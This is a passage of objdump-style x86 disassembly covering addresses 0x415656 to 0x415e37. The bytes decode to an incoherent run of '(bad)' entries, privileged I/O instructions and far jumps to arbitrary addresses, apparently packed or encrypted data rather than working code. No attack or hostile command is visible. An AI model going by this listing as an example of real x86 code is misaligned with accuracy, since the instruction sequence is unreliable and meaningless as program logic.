  415656:	and    esp,DWORD PTR [ebp+ebx*1+0x37]
  41565a:	ret    0xd1f1
  41565d:	push   edi
  41565e:	xor    al,BYTE PTR [esi+0x3]
  415661:	and    BYTE PTR [edi],al
  415663:	jge    0x415652
  415665:	test   BYTE PTR [eax-0x6f0a04e3],dl
  41566b:	fsubrp st(5),st
  41566d:	dec    ecx
  41566e:	jns    0x415699
  415670:	into   
  415671:	add    edx,eax
  415673:	inc    eax
  415674:	mov    eax,ds:0x13b31eb3
  415679:	retf   
  41567a:	or     al,0xab
  41567c:	mov    BYTE PTR [edx],0x5b
  41567f:	int    0x13
  415681:	aas    
  415682:	icebp  
  415683:	jge    0x4156c3
  415685:	sub    al,0xfc
  415687:	hlt    
  415688:	sub    ch,BYTE PTR [ebx]
  41568a:	std    
  41568b:	ror    esi,1
  41568d:	lds    esi,FWORD PTR [esi-0x63d992f5]
  415693:	call   0x8d26:0x29eafc6
  41569a:	ins    BYTE PTR es:[edi],dx
  41569b:	das    
  41569c:	scas   eax,DWORD PTR es:[edi]
  41569d:	out    0xcc,eax
  41569f:	retf   0xf13c
  4156a2:	xor    ebx,DWORD PTR [ebp-0x3e]
  4156a5:	fmul   DWORD PTR [edi]
  4156a7:	repz lahf 
  4156a9:	inc    ecx
  4156aa:	or     BYTE PTR [esp+ebx*4+0x31],0xf6
  4156af:	test   dl,cl
  4156b1:	test   eax,0x6566d02b
  4156b6:	sbb    al,0x83
  4156b8:	sub    DWORD PTR [ebp+0x63c6c606],edi
  4156be:	std    
  4156bf:	sbb    ebp,DWORD PTR ss:[ecx+esi*4]
  4156c3:	mov    dl,bh
  4156c5:	mov    cs,WORD PTR [edi+0xc]
  4156c8:	in     al,0x33
  4156ca:	pop    ss
  4156cb:	add    eax,DWORD PTR [edi]
  4156cd:	cmp    WORD PTR [edi-0x57],cx
  4156d1:	std    
  4156d2:	ins    BYTE PTR es:[edi],dx
  4156d3:	imul   esi,eax,0xffffffb0
  4156d6:	fst    QWORD PTR [eax]
  4156d8:	das    
  4156d9:	sub    BYTE PTR [edi-0x6333cdba],dl
  4156df:	jne    0x4156cb
  4156e1:	pop    ebx
  4156e2:	lahf   
  4156e3:	and    eax,0xa4fdceb7
  4156e8:	into   
  4156e9:	cmp    bl,cl
  4156eb:	inc    ecx
  4156ec:	jmp    0xbe0:0xa95ab253
  4156f3:	cmp    eax,0x80bf0b58
  4156f8:	jge    0x41573c
  4156fa:	cmp    esi,DWORD PTR [edx-0x77]
  4156fd:	aad    0xbd
  4156ff:	in     eax,dx
  415700:	enter  0x9fd1,0xf7
  415704:	cdq    
  415705:	lahf   
  415706:	xchg   ch,cl
  415708:	xchg   ebx,eax
  415709:	mov    ss,WORD PTR [edx+0x5]
  41570c:	imul   esi,DWORD PTR [esp+ebx*1],0xffffffb7
  415710:	add    edx,DWORD PTR [ebp+0x34f0dcb9]
  415716:	inc    esi
  415717:	and    eax,0x90429313
  41571c:	add    esp,esi
  41571e:	pop    esi
  41571f:	xchg   DWORD PTR [edx],ebp
  415721:	repz in eax,dx
  415723:	scas   al,BYTE PTR es:[edi]
  415724:	push   eax
  415725:	xor    eax,DWORD PTR [eax-0x68f47f62]
  41572b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41572c:	mov    ecx,DWORD PTR [eax+0x13be2886]
  415732:	sub    BYTE PTR [eax-0x179e014c],dh
  415738:	fdivrp st(5),st
  41573a:	adc    esp,DWORD PTR [eax+0x3493ca33]
  415740:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415741:	ds es lock xor ch,ah
  415746:	xor    eax,0x27d75982
  41574b:	add    DWORD PTR ds:0x9c8773a6,edi
  415751:	push   edx
  415752:	icebp  
  415753:	jl     0x4156e6
  415755:	es push ebx
  415757:	cmc    
  415758:	ret    
  415759:	sub    edi,DWORD PTR [edx-0x5f713180]
  41575f:	icebp  
  415760:	imul   ebp,DWORD PTR [esi+0x3e],0xfffffffa
  415764:	jb     0x4157cd
  415766:	sti    
  415767:	ins    DWORD PTR es:[edi],dx
  415768:	jecxz  0x415724
  41576a:	push   ss
  41576b:	mov    edx,0x8efbb48c
  415770:	pop    eax
  415771:	or     al,al
  415773:	imul   ecx,esi,0xffffffa8
  415776:	adc    eax,0x4775bd6d
  41577b:	lds    ebx,FWORD PTR [ebx+0x2bae3614]
  415781:	xchg   esp,eax
  415782:	hlt    
  415783:	inc    esi
  415784:	jmp    0xdada08e3
  415789:	es mov eax,0x1b0d654d
  41578f:	(bad)  
  415790:	std    
  415791:	stc    
  415792:	sub    ebx,DWORD PTR [ecx-0x27]
  415795:	rep stos BYTE PTR es:[edi],al
  415797:	call   0xb8cf:0x8ca83915
  41579e:	or     eax,0x7fd1497d
  4157a3:	ds dec edx
  4157a5:	cmp    ch,al
  4157a7:	lods   al,BYTE PTR ds:[esi]
  4157a8:	push   es
  4157a9:	or     DWORD PTR [edi],0x1
  4157ac:	mov    ch,ch
  4157ae:	pop    ds
  4157af:	popf   
  4157b0:	cdq    
  4157b1:	(bad)  
  4157b3:	xor    DWORD PTR [ebp+0x4b2b2391],0x78
  4157ba:	or     DWORD PTR [esi-0x5e],0xde396016
  4157c1:	lock daa 
  4157c3:	push   0xffffffb5
  4157c5:	rol    BYTE PTR [ecx+0xbda0b5],0xd6
  4157cc:	lock and BYTE PTR [edi-0x14f08091],bl
  4157d3:	into   
  4157d4:	and    al,0x78
  4157d6:	pushf  
  4157d7:	xchg   edx,eax
  4157d8:	mov    al,ds:0x42a651a6
  4157dd:	xchg   ebp,eax
  4157de:	mov    ds:0xeeb86992,al
  4157e3:	or     esp,eax
  4157e5:	jl     0x415788
  4157e7:	pop    ss
  4157e8:	dec    edx
  4157e9:	jl     0x4157e7
  4157eb:	test   BYTE PTR [ebp+0x28b55cd0],ah
  4157f1:	xchg   edx,eax
  4157f2:	int3   
  4157f3:	addr16 cdq 
  4157f5:	xchg   esi,eax
  4157f6:	inc    ecx
  4157f7:	test   BYTE PTR [ecx],bl
  4157f9:	inc    eax
  4157fa:	fcom   st(2)
  4157fc:	dec    ebx
  4157fd:	push   ebp
  4157fe:	stos   DWORD PTR es:[edi],eax
  4157ff:	leave  
  415800:	dec    eax
  415801:	sti    
  415802:	aaa    
  415803:	dec    al
  415805:	retf   
  415806:	push   eax
  415807:	cdq    
  415808:	inc    eax
  415809:	call   0x1bc8e657
  41580e:	inc    ebx
  41580f:	or     ah,BYTE PTR [ecx-0x4ea361f5]
  415815:	je     0x4157a4
  415817:	(bad)  
  415818:	shl    DWORD PTR [esi+0x25504041],1
  41581e:	add    DWORD PTR [ebx+0x1c2519a2],edi
  415824:	dec    edi
  415825:	nop
  415826:	rcr    BYTE PTR [esp+eiz*2],cl
  415829:	xchg   esp,eax
  41582a:	add    ecx,DWORD PTR ss:[esp+eiz*2+0x36c98058]
  415832:	mov    edx,?
  415834:	bound  ebx,QWORD PTR [ebx+0x24]
  415837:	cli    
  415838:	push   0xffffffd1
  41583a:	sahf   
  41583b:	cdq    
  41583c:	out    0x75,al
  41583e:	hlt    
  41583f:	mov    ebx,0xa3554c48
  415844:	sbb    DWORD PTR [esi+0x4c],esp
  415847:	cld    
  415848:	push   ecx
  415849:	pop    ebp
  41584a:	out    0x1,eax
  41584c:	sub    eax,0x533f798c
  415851:	push   es
  415852:	sbb    DWORD PTR [esi-0x76],ebx
  415855:	mov    ebp,0xb0e21ff0
  41585a:	mov    cl,0x8f
  41585c:	push   ebp
  41585d:	leave  
  41585e:	add    ebx,ebx
  415860:	sahf   
  415861:	xlat   BYTE PTR ds:[ebx]
  415862:	cld    
  415863:	out    dx,eax
  415864:	push   ebx
  415865:	call   0x3149:0xde9eb046
  41586c:	add    ch,BYTE PTR [edx+0x50]
  41586f:	aas    
  415870:	leave  
  415871:	(bad)  
  415872:	dec    edx
  415873:	mov    bl,0xd4
  415875:	and    DWORD PTR [edx+esi*2+0x3],edx
  415879:	or     al,dl
  41587b:	dec    esp
  41587c:	js     0x4158b4
  41587e:	dec    esi
  41587f:	(bad)  
  415880:	in     eax,dx
  415881:	or     bh,BYTE PTR [ebx+0x24d597fe]
  415887:	xchg   ecx,eax
  415888:	adc    esi,DWORD PTR [esi]
  41588a:	lods   al,BYTE PTR ds:[esi]
  41588b:	pushf  
  41588c:	jb     0x415894
  41588e:	int3   
  41588f:	adc    al,0x48
  415891:	mov    ebx,ebp
  415893:	test   BYTE PTR [ecx-0x66],dl
  415896:	popf   
  415897:	mov    eax,ds:0x6622e745
  41589c:	inc    bx
  41589e:	cwde   
  41589f:	xor    esp,DWORD PTR [esp+eax*2+0x74]
  4158a3:	idiv   BYTE PTR [edx]
  4158a5:	rol    DWORD PTR [ebp+0x3c],cl
  4158a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158a9:	pop    edi
  4158aa:	inc    bh
  4158ac:	aam    0x7f
  4158ae:	jmp    0x96c2a0b5
  4158b3:	dec    esi
  4158b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158b5:	(bad)  
  4158b6:	xor    al,0x62
  4158b8:	lods   eax,DWORD PTR ds:[esi]
  4158b9:	mov    ecx,0x69fd04fd
  4158be:	sub    ecx,DWORD PTR ds:0xef9e3491
  4158c4:	sub    DWORD PTR [edi+0x7d89d260],0x57761c06
  4158ce:	push   cs
  4158cf:	mov    ch,0x77
  4158d1:	arpl   WORD PTR [esi+0x1b30780a],dx
  4158d7:	xlat   BYTE PTR ds:[ebx]
  4158d8:	mov    ds:0x149a33cd,al
  4158dd:	popa   
  4158de:	xor    BYTE PTR [edx],cl
  4158e0:	aam    0x91
  4158e2:	(bad)  
  4158e3:	popf   
  4158e4:	jp     0x4158a0
  4158e6:	out    0x2d,eax
  4158e8:	jnp    0x4158c0
  4158ea:	jle    0x4158f5
  4158ec:	pusha  
  4158ed:	repz (bad) 
  4158ef:	std    
  4158f0:	into   
  4158f1:	and    DWORD PTR [ecx+ebp*1+0x2ecc6a0],edx
  4158f8:	stos   DWORD PTR es:[edi],eax
  4158f9:	sub    al,0xa4
  4158fb:	mov    ah,0x76
  4158fd:	jmp    0xd196806a
  415902:	pop    ss
  415903:	pop    ebx
  415904:	jne    0x41591b
  415906:	cdq    
  415907:	or     dh,BYTE PTR [ecx+0x5d14a863]
  41590d:	add    al,0xa4
  41590f:	add    al,0xa4
  415911:	and    edx,ebp
  415913:	mov    ebx,0xad49d1ec
  415918:	mov    dh,0x40
  41591a:	and    DWORD PTR [ecx-0xe],ebx
  41591d:	cli    
  41591e:	cmp    cl,BYTE PTR [ecx-0x1b]
  415921:	and    al,0x36
  415923:	cwde   
  415924:	into   
  415925:	xor    al,ch
  415927:	retf   
  415928:	adc    DWORD PTR [ecx],edi
  41592a:	iretw  
  41592c:	imul   ecx,DWORD PTR [edi],0x41d5c529
  415932:	lahf   
  415933:	cmp    eax,0x9315c151
  415938:	jl     0x41598e
  41593a:	xor    ah,BYTE PTR [ecx+0x7b]
  41593d:	inc    ebx
  41593e:	cld    
  41593f:	jae    0x415903
  415941:	retf   0x90dc
  415944:	mov    bl,0x13
  415946:	mov    ebx,0x7ad16181
  41594b:	add    ebx,DWORD PTR [eax-0x44810624]
  415951:	sub    eax,DWORD PTR ds:0xab9b7701
  415957:	dec    ebx
  415958:	inc    ecx
  415959:	pop    ebp
  41595a:	mov    eax,0x4940eb00
  41595f:	repz mov esi,0xb187ec4d
  415965:	add    esi,edi
  415967:	retf   0x203e
  41596a:	aas    
  41596b:	fst    DWORD PTR [edx]
  41596d:	mov    ch,BYTE PTR [ebx+eax*8-0x2788caf3]
  415974:	ret    0xdb7e
  415977:	mov    al,0xc3
  415979:	pop    ds
  41597a:	into   
  41597b:	xor    edi,DWORD PTR [edx]
  41597d:	and    dh,dh
  41597f:	mov    dh,0x65
  415981:	retf   
  415982:	mov    edx,0x9a719732
  415987:	add    DWORD PTR [esi-0x6df38207],edx
  41598d:	(bad)  
  41598e:	sbb    DWORD PTR [edi+0x6b],esi
  415991:	push   0x3a
  415993:	inc    edi
  415994:	xchg   ebp,eax
  415995:	mov    bl,BYTE PTR [edi]
  415997:	shl    DWORD PTR [edi],0xce
  41599a:	jmp    0xc34b:0x31aab761
  4159a1:	adc    al,0x77
  4159a3:	data16 cmp BYTE PTR [ecx+0x2897f73],ah
  4159aa:	neg    DWORD PTR [eax]
  4159ac:	scas   eax,DWORD PTR es:[edi]
  4159ad:	mov    dl,0xc5
  4159af:	js     0x4159a4
  4159b1:	cmc    
  4159b2:	dec    esp
  4159b3:	push   esi
  4159b4:	or     dh,al
  4159b6:	test   esi,ebx
  4159b8:	mov    esi,0x760007bd
  4159bd:	add    ch,0x79
  4159c0:	push   edi
  4159c1:	push   ecx
  4159c2:	and    DWORD PTR [ebx],0x36
  4159c5:	sbb    edi,DWORD PTR [esi]
  4159c7:	lods   al,BYTE PTR ds:[esi]
  4159c8:	sub    BYTE PTR [esi],cl
  4159ca:	mov    DWORD PTR [ecx-0x3668f40b],ebp
  4159d0:	test   ebp,ebx
  4159d2:	push   esp
  4159d3:	push   gs
  4159d5:	fisubr DWORD PTR [ecx-0x32c4a2aa]
  4159db:	fldenv [ebx+0x3c]
  4159de:	inc    esp
  4159df:	retf   
  4159e0:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4159e2:	in     al,dx
  4159e3:	out    dx,al
  4159e4:	test   eax,0xf7cbc448
  4159e9:	mov    esp,0xc1734c08
  4159ee:	jmp    0xb8829ee2
  4159f3:	pop    ss
  4159f4:	in     eax,dx
  4159f5:	inc    ecx
  4159f6:	out    dx,al
  4159f7:	jg     0x4159f8
  4159f9:	fist   WORD PTR [ebx-0x29]
  4159fc:	in     eax,dx
  4159fd:	in     eax,dx
  4159fe:	shr    DWORD PTR [ebx-0x31ac65b1],cl
  415a04:	out    dx,al
  415a05:	cmp    eax,0xace0e359
  415a0a:	dec    eax
  415a0b:	cmp    ch,bl
  415a0d:	and    esp,DWORD PTR [edi]
  415a0f:	mov    ecx,0x9dede1f1
  415a14:	popf   
  415a15:	ja     0x415a2a
  415a17:	or     BYTE PTR [ecx+0x45],ah
  415a1a:	ss int3 
  415a1c:	mov    eax,DWORD PTR [esi+edx*8-0x27066e84]
  415a23:	ins    DWORD PTR es:[edi],dx
  415a24:	out    0x78,al
  415a26:	dec    eax
  415a27:	les    edx,FWORD PTR [ecx+eiz*4]
  415a2a:	cld    
  415a2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a2c:	nop
  415a2d:	shl    ecx,cl
  415a2f:	mov    al,ds:0x30af1daa
  415a34:	fwait
  415a35:	(bad)
  415a38:	mov    bh,0xf7
  415a3a:	sub    DWORD PTR [ebx+0x11],0x12a28403
  415a41:	or     esi,DWORD PTR [esi+0x775eb1b0]
  415a47:	xchg   esi,eax
  415a48:	shr    DWORD PTR [edi],1
  415a4a:	and    dh,BYTE PTR [ebp+0x6b]
  415a4d:	iret   
  415a4e:	sbb    dl,BYTE PTR [ebp-0x1d82efc5]
  415a54:	jg     0x415a43
  415a56:	(bad)  
  415a57:	pop    ecx
  415a58:	(bad)  
  415a59:	mov    ecx,0x56aa8cd5
  415a5e:	push   ebp
  415a5f:	arpl   WORD PTR [eax],cx
  415a61:	jbe    0x415a39
  415a63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a64:	adc    al,0x54
  415a66:	sub    al,0x2
  415a68:	cmp    dh,ah
  415a6a:	dec    esi
  415a6b:	cmp    DWORD PTR [ebx-0x562b65f0],0xffffff87
  415a72:	mov    cs,WORD PTR [edx]
  415a74:	xchg   ebx,eax
  415a75:	xchg   edx,eax
  415a76:	frstor [ecx+0x151ba79b]
  415a7c:	jg     0x415a73
  415a7e:	das    
  415a7f:	stc    
  415a80:	test   DWORD PTR [ebp-0xf],edi
  415a83:	push   0x70cef53c
  415a88:	fdivr  st(7),st
  415a8a:	outs   dx,BYTE PTR ds:[esi]
  415a8b:	dec    ecx
  415a8c:	xor    DWORD PTR [edx],eax
  415a8e:	cdq    
  415a8f:	pop    ds
  415a90:	xor    eax,0x64904c99
  415a95:	pusha  
  415a96:	xchg   esi,eax
  415a97:	inc    esp
  415a98:	call   0x987a:0x9f00cd79
  415a9f:	sub    ah,bh
  415aa1:	inc    esp
  415aa2:	test   DWORD PTR [edi-0x12387e8d],eax
  415aa8:	dec    eax
  415aaa:	mov    cl,0x97
  415aac:	aad    0x68
  415aae:	adc    DWORD PTR [eax+0x54],esi
  415ab1:	test   DWORD PTR [edi-0x1f23ca75],edi
  415ab7:	in     eax,dx
  415ab8:	pusha  
  415ab9:	cli    
  415aba:	aad    0x52
  415abc:	add    al,dh
  415abe:	rcr    DWORD PTR [edi+ebp*2+0x44],cl
  415ac2:	int    0xa2
  415ac4:	les    ebx,FWORD PTR [edi-0x8]
  415ac7:	das    
  415ac8:	sub    DWORD PTR [ebx],edi
  415aca:	mov    esi,0x825e0bc0
  415acf:	inc    ebp
  415ad0:	div    BYTE PTR [eax+edx*8+0x20]
  415ad4:	sub    eax,0x9710570
  415ad9:	test   BYTE PTR [ebp+0xccf6728],bh
  415adf:	fsincos 
  415ae1:	enter  0xb9b0,0xd6
  415ae5:	fldz   
  415ae7:	dec    esi
  415ae8:	push   ds
  415ae9:	dec    edx
  415aea:	xchg   esi,eax
  415aeb:	cmp    eax,0xeaad4432
  415af0:	mov    ecx,0xd7c12318
  415af5:	and    BYTE PTR [ecx],bl
  415af7:	sbb    DWORD PTR ss:[eax-0x54881b85],esp
  415afe:	mov    eax,0x55fdf702
  415b03:	xor    BYTE PTR [ebx+0x18172553],0xda
  415b0a:	mov    ds:0x2be9806c,al
  415b0f:	and    BYTE PTR [edx+0x713da03a],0xb3
  415b16:	mov    eax,0x949b095b
  415b1b:	pop    edi
  415b1c:	add    esi,edx
  415b1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b1f:	cmc    
  415b20:	add    ecx,edi
  415b22:	test   al,0x90
  415b24:	out    0x76,eax
  415b26:	pop    ds
  415b27:	jg     0x415ba8
  415b29:	loop   0x415b40
  415b2b:	or     DWORD PTR [ebp+eax*4-0x45],ebx
  415b2f:	rcr    DWORD PTR [ecx+ebx*1],1
  415b32:	inc    ebp
  415b33:	inc    esp
  415b34:	add    ebx,eax
  415b36:	ja     0x415b6c
  415b38:	xchg   ebp,eax
  415b39:	cli    
  415b3a:	mov    ds:0x9b7a506b,al
  415b3f:	or     DWORD PTR [ecx],eax
  415b41:	jge    0x415ba5
  415b43:	mov    cl,0x39
  415b45:	aam    0x44
  415b47:	inc    ebp
  415b48:	cmp    bh,al
  415b4a:	add    dl,0xc
  415b4d:	xor    ebp,DWORD PTR [edx]
  415b4f:	div    BYTE PTR [esi]
  415b51:	xor    BYTE PTR [edi+0x4f],al
  415b54:	or     eax,0x227779a9
  415b59:	mov    dl,0xfc
  415b5b:	push   ds
  415b5c:	push   eax
  415b5d:	pusha  
  415b5e:	push   0x48
  415b60:	mov    ch,0x6a
  415b62:	mov    dl,0xa3
  415b64:	mov    ?,WORD PTR [esi-0x47]
  415b67:	push   0x2b10a800
  415b6c:	fild   WORD PTR [ebx-0x352cbe15]
  415b72:	mov    ah,0x29
  415b74:	add    bl,0xbb
  415b77:	sub    DWORD PTR [edi-0x538877],esp
  415b7d:	ja     0x415b07
  415b7f:	adc    eax,0x665c3d65
  415b84:	mov    ah,0xa
  415b86:	xlat   BYTE PTR ds:[ebx]
  415b87:	ins    BYTE PTR es:[edi],dx
  415b88:	adc    ebx,DWORD PTR ds:0x845a8824
  415b8e:	mov    ds:0x77d814da,eax
  415b93:	mov    al,ds:0xeba57191
  415b98:	mov    dh,0xb1
  415b9a:	sbb    al,0xac
  415b9c:	xchg   esp,eax
  415b9d:	aam    0x27
  415b9f:	aas    
  415ba0:	daa    
  415ba1:	ret    
  415ba2:	mov    al,0xc8
  415ba4:	mov    ebx,0x78c89f4e
  415ba9:	mov    cl,dl
  415bab:	leave  
  415bac:	jbe    0x415bb3
  415bae:	mov    edx,0x88b0f9a0
  415bb3:	add    DWORD PTR [ebp-0x6583459f],0xffffff99
  415bba:	call   0x6710f50a
  415bbf:	call   0xbdb1a2ef
  415bc4:	jmp    0x415bb8
  415bc6:	or     bh,BYTE PTR [esi+0x3a]
  415bc9:	outs   dx,BYTE PTR ds:[esi]
  415bca:	into   
  415bcb:	rcr    BYTE PTR [ecx+0x3180b0e5],cl
  415bd1:	stc    
  415bd2:	and    DWORD PTR [edx],0x73
  415bd5:	cld    
  415bd6:	call   0x18e415b1
  415bdb:	shl    cl,1
  415bdd:	arpl   dx,bp
  415bdf:	pop    esi
  415be0:	cli    
  415be1:	rcl    DWORD PTR [edx],cl
  415be3:	rol    BYTE PTR [esi-0x675f69d9],cl
  415be9:	loop   0x415bbe
  415beb:	mov    bl,0x91
  415bed:	imul   eax,ecx,0x9fd96994
  415bf3:	repz inc esp
  415bf5:	push   edi
  415bf6:	pop    es
  415bf7:	adc    cl,bl
  415bf9:	(bad)  
  415bfb:	or     edi,DWORD PTR [esi]
  415bfd:	rol    BYTE PTR [edi+0x42e816e3],1
  415c03:	mov    ah,0x55
  415c05:	in     eax,0xb7
  415c07:	dec    esp
  415c08:	adc    DWORD PTR [edi-0x5c394738],edi
  415c0e:	clc    
  415c0f:	jp     0x415c69
  415c11:	fisub  WORD PTR [edx]
  415c13:	pusha  
  415c14:	aam    0x73
  415c16:	and    DWORD PTR [ecx],esi
  415c18:	pushf  
  415c19:	fiadd  DWORD PTR [ecx-0x16]
  415c1c:	ja     0x415c86
  415c1e:	jae    0x415bce
  415c20:	sub    al,ch
  415c22:	cmc    
  415c23:	into   
  415c24:	nop
  415c25:	sbb    al,0x28
  415c27:	fcomp  QWORD PTR [ebx+0x4b]
  415c2a:	fimul  DWORD PTR [eax-0x73]
  415c2d:	lds    esp,FWORD PTR [eax-0xa]
  415c30:	pop    esp
  415c31:	sbb    eax,DWORD PTR [eax]
  415c33:	xchg   DWORD PTR [edx],ebp
  415c35:	inc    ebp
  415c36:	sub    eax,0x3336899f
  415c3b:	int3   
  415c3c:	loop   0x415c2b
  415c3e:	mov    DWORD PTR [ecx-0x26],edi
  415c41:	adc    al,cl
  415c43:	inc    eax
  415c44:	xor    dh,ch
  415c46:	mov    cl,0xa1
  415c48:	xlat   BYTE PTR ds:[ebx]
  415c49:	push   ss
  415c4a:	pop    ebp
  415c4b:	push   esi
  415c4c:	popf   
  415c4d:	cs pop eax
  415c4f:	cmp    eax,0x42aaf9ab
  415c54:	sahf   
  415c55:	jmp    0xa0027f79
  415c5a:	loop   0x415cab
  415c5c:	push   esi
  415c5d:	push   ss
  415c5e:	add    DWORD PTR [eax+0x5584527e],eax
  415c64:	jbe    0x415bf9
  415c66:	data16 cld 
  415c68:	fsub   QWORD PTR [ebp+ebp*2-0x5d8c9588]
  415c6f:	pop    edx
  415c70:	add    ebx,esp
  415c72:	cs popf 
  415c74:	sub    al,0x35
  415c76:	jb     0x415cb9
  415c78:	dec    BYTE PTR [ebp-0x2e]
  415c7b:	mov    bh,0xec
  415c7d:	or     BYTE PTR [esi+edx*8-0x8],0xf9
  415c82:	sahf   
  415c83:	adc    DWORD PTR [edi],ebp
  415c85:	dec    ecx
  415c86:	retf   0x7635
  415c89:	es retf 
  415c8b:	inc    ecx
  415c8c:	cmp    edx,DWORD PTR [ebx-0x54]
  415c8f:	int3   
  415c90:	push   cs
  415c91:	adc    dh,BYTE PTR [ebp+0x1e]
  415c94:	add    al,0xf0
  415c96:	enter  0x3f64,0x2
  415c9a:	cld    
  415c9b:	bound  edx,QWORD PTR [esi-0x5afaec89]
  415ca1:	sar    DWORD PTR [edi-0x23],1
  415ca4:	inc    esi
  415ca5:	je     0x415d03
  415ca7:	int3   
  415ca8:	(bad)  
  415ca9:	pop    ecx
  415caa:	aas    
  415cab:	arpl   WORD PTR [eax+0x40],ax
  415cae:	pop    edx
  415caf:	jne    0x415c53
  415cb1:	dec    ebx
  415cb2:	mov    bh,0x34
  415cb4:	rol    edx,0x9f
  415cb7:	(bad)  
  415cb8:	push   0x5e
  415cba:	mov    esi,0xca25bbab
  415cbf:	pusha  
  415cc0:	xor    BYTE PTR [ebx],ch
  415cc2:	jp     0x415c6d
  415cc4:	popa   
  415cc5:	push   ebx
  415cc6:	dec    eax
  415cc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415cc8:	jmp    FWORD PTR [esi]
  415cca:	pop    ecx
  415ccb:	xchg   esp,eax
  415ccc:	dec    esp
  415ccd:	inc    ebp
  415cce:	pop    ebp
  415ccf:	push   0xffffff83
  415cd1:	nop
  415cd2:	jns    0x415cc0
  415cd4:	push   ss
  415cd5:	(bad)  
  415cd6:	cwde   
  415cd7:	loope  0x415d22
  415cd9:	fcomi  st,st(4)
  415cdb:	mov    cl,0x90
  415cdd:	push   cs
  415cde:	loop   0x415cdc
  415ce0:	xor    al,0x29
  415ce2:	dec    edi
  415ce3:	aam    0x23
  415ce5:	jae    0x415d54
  415ce7:	fmul   DWORD PTR [edi+0x244029e4]
  415ced:	and    eax,DWORD PTR ds:0x71d2c063
  415cf3:	imul   edx,DWORD PTR [ecx-0x30],0xf92dd8b
  415cfa:	xchg   esi,eax
  415cfb:	pusha  
  415cfc:	clc    
  415cfd:	cmp    ch,BYTE PTR [edx-0x41be691]
  415d03:	jno    0x415d08
  415d05:	push   edx
  415d06:	and    BYTE PTR [edx+0x3f],0x25
  415d0a:	pop    ecx
  415d0b:	jo     0x415d7e
  415d0d:	cli    
  415d0e:	loop   0x415d60
  415d10:	and    al,BYTE PTR [esp+ebx*2]
  415d13:	test   eax,0xc598bcfb
  415d18:	mov    ds:0xeaf3ce52,al
  415d1d:	sub    al,0xfd
  415d1f:	stc    
  415d20:	(bad)  
  415d21:	ficom  WORD PTR [ebx+eiz*1]
  415d24:	out    dx,al
  415d25:	cmp    eax,0xd92c66ef
  415d2a:	imul   eax,eax,0x609b1480
  415d30:	sbb    ah,dh
  415d32:	idiv   BYTE PTR [ebp+0x2feacd9d]
  415d38:	or     esi,DWORD PTR ds:0x4670649d
  415d3e:	push   esp
  415d3f:	push   ecx
  415d40:	out    0x96,eax
  415d42:	fwait
  415d43:	jns    0x415d39
  415d45:	jae    0x415d27
  415d47:	into   
  415d48:	pop    es
  415d49:	xor    eax,0xad9b9369
  415d4e:	adc    cl,BYTE PTR fs:[esi-0x44]
  415d52:	xchg   edx,eax
  415d53:	jmp    FWORD PTR [ebp+eiz*2+0x63]
  415d57:	jl     0x415d88
  415d59:	xchg   ecx,eax
  415d5a:	retf   0x5e52
  415d5d:	pusha  
  415d5e:	xchg   ebp,eax
  415d5f:	cmp    dl,BYTE PTR [eax-0x48]
  415d62:	push   cs
  415d63:	gs or  edi,esp
  415d66:	arpl   WORD PTR [eax-0x6e],cx
  415d69:	inc    eax
  415d6a:	rol    DWORD PTR [esi+0x57],1
  415d6d:	add    DWORD PTR [ecx+0x44],edi
  415d70:	pop    ss
  415d71:	fst    QWORD PTR [ebp-0x48]
  415d74:	pop    es
  415d75:	call   0x5f98:0x4bdeb6a4
  415d7c:	adc    eax,0xc17123e8
  415d81:	xor    ebp,DWORD PTR [ecx-0x15f8b1da]
  415d87:	or     BYTE PTR [ebp+ebx*2+0x60368177],al
  415d8e:	cmp    eax,DWORD PTR [ebx+0x1b]
  415d91:	add    BYTE PTR [esi+0x61137af3],bh
  415d97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d98:	in     eax,dx
  415d99:	adc    eax,0xa5ba2efc
  415d9e:	loopne 0x415dbb
  415da0:	sbb    eax,0x3bad33fe
  415da5:	sbb    eax,0xf51a159f
  415daa:	xchg   esi,eax
  415dab:	push   0xda615056
  415db0:	jmp    0x33b7e28b
  415db5:	xchg   ebx,eax
  415db6:	inc    edx
  415db7:	mov    dl,0x4b
  415db9:	ins    DWORD PTR es:[edi],dx
  415dba:	(bad)  
  415dbc:	xor    BYTE PTR [ebx+ebx*4],ch
  415dbf:	(bad)  
  415dc0:	xchg   ecx,eax
  415dc1:	shl    DWORD PTR [ebp-0x4f21d6e0],cl
  415dc7:	inc    ecx
  415dc8:	ror    BYTE PTR [ecx-0x68d5887d],cl
  415dce:	pop    es
  415dcf:	and    BYTE PTR [eax-0x20],0xba
  415dd3:	nop
  415dd4:	jo     0x415e2d
  415dd6:	inc    edi
  415dd7:	and    eax,0x77655ff8
  415ddc:	mov    esp,0x2ab1ef8e
  415de1:	pop    edi
  415de2:	add    BYTE PTR [edx+esi*4+0x6b],cl
  415de6:	inc    edx
  415de7:	xchg   ecx,eax
  415de8:	add    edi,0xd2defa1d
  415dee:	jp     0x415dfa
  415df0:	aam    0x8
  415df2:	mov    ah,0x29
  415df4:	sbb    eax,0xf18e295b
  415df9:	cs loop 0x415d9b
  415dfc:	xor    DWORD PTR [edx],esp
  415dfe:	jecxz  0x415e7a
  415e00:	phaddsw mm3,QWORD PTR ds:0x78439f78
  415e08:	and    al,0x69
  415e0a:	arpl   WORD PTR [edx-0x2d],si
  415e0d:	or     BYTE PTR [ebp-0x5a0f7fe9],dh
  415e13:	mov    ?,WORD PTR [ebp-0x1b]
  415e16:	mov    dl,0x93
  415e18:	stc    
  415e19:	mov    eax,ds:0x11c2254d
  415e1e:	xchg   BYTE PTR [ebp-0x50],al
  415e21:	jbe    0x415e05
  415e23:	aam    0xc1
  415e25:	jb     0x415de0
  415e27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e28:	and    BYTE PTR [edi-0x21153f5c],0x53
  415e2f:	cmp    DWORD PTR [ecx+eiz*1-0x5a058577],ebp
  415e36:	(bad)  
  415e37:	repz call 0xd9a39c61
